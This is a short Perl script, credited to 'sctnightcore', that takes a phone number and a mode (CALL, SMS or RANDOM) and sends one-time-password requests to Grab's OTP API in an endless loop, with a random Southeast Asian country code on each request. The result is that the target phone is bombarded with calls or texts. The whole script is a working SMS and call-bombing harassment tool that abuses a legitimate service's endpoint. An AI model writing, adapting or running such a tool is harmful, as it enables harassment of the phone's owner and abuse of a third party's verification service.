#by : sctnightcore
#ty :  https://github.com/likecyber/php-cli-gac-spammer [likecyber]
use strict; use warnings;
use LWP::UserAgent;
my $go;
&main();

sub main {
	errorarrgv();
	while (1) {	
		api();
	}	
}

sub errorarrgv{
	my $num_args = $#ARGV + 1;
	if ($num_args != 2) {
		print "By sctnightcore\n";
		print "Usage: spamcall.pl number CALL|SMS|RANDOM\n";
		exit;
	}
}

sub callsmsrandom {
	if ($ARGV[1] eq 'CALL' ) {
		$go = 'CALL';
	} 
	if ($ARGV[1] eq 'SMS') {
		$go = 'SMS';
	}
	if ($ARGV[1] eq 'RANDOM' ) {
		my @index = ('CALL','SMS');
		$go = $index[rand @index]; 
	}
	return $go
}
sub api {
	my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",
		Content => 'method='.callsmsrandom().'&countryCode='.ccode().'&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4'
	);
	if ( $res->is_success ) { #check http code : 200
		print "[ ".$res->code." ][".ccode()."]".lc($go)." requested \n";
	}
}

sub ccode {
	my @countries = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM');
	my $ccode = $countries[rand @countries];
	return $ccode;	
}
